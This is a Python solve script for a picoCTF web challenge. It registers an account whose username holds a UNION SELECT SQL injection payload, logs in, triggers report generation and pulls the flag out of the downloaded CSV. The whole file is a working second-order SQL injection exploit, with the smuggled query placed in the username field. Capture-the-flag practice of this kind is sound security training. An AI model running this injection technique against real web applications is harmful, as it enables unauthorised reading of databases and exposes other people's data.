import requests
import re
import time

# ================== CONFIG ==================
BASE_URL = "http://YOUR_INSTANCE_URL_HERE"   # Example: http://witty-capybara.picoctf.net:51234
USERNAME = "' UNION SELECT *,NULL FROM aDNyM19uMF9mMTRn--"
PASSWORD = "pass123"
EMAIL = "test@example.com"
# ===========================================

s = requests.Session()

def register():
    print("[+] Registering account...")
    data = {
        "username": USERNAME,
        "password": PASSWORD,
        "email": EMAIL
    }
    r = s.post(f"{BASE_URL}/register", json=data)
    print("Register response:", r.text.strip())

def login():
    print("[+] Logging in...")
    data = {
        "username": USERNAME,
        "password": PASSWORD
    }
    r = s.post(f"{BASE_URL}/login", json=data)
    print("Login response:", r.text.strip())
    if r.status_code == 200:
        print("[+] Login successful!")

def generate_report():
    print("[+] Generating report...")
    r = s.post(f"{BASE_URL}/report", json={})   # or GET depending on the challenge
    print("Report response:", r.text.strip())

def download_csv():
    print("[+] Downloading CSV report...")
    r = s.get(f"{BASE_URL}/download-report")   # Common endpoint
    if r.status_code == 200 and "csv" in r.headers.get("Content-Type", ""):
        with open("report.csv", "wb") as f:
            f.write(r.content)
        print("[+] Report saved as report.csv")
        
        # Extract flag
        match = re.search(r"picoCTF\{[^}]+\}", r.text)
        if match:
            print("\n🎉 FLAG FOUND:", match.group(0))
        else:
            print("\nFlag not found in response. Check report.csv manually.")
            print("First 500 chars:", r.text[:500])
    else:
        print("[-] Failed to download CSV. Status:", r.status_code)

# ===================== RUN =====================
if __name__ == "__main__":
    if "YOUR_INSTANCE_URL_HERE" in BASE_URL:
        print("[-] Please replace YOUR_INSTANCE_URL_HERE with your actual URL!")
    else:
        register()
        time.sleep(1)
        login()
        time.sleep(2)
        generate_report()
        time.sleep(3)
        download_csv()
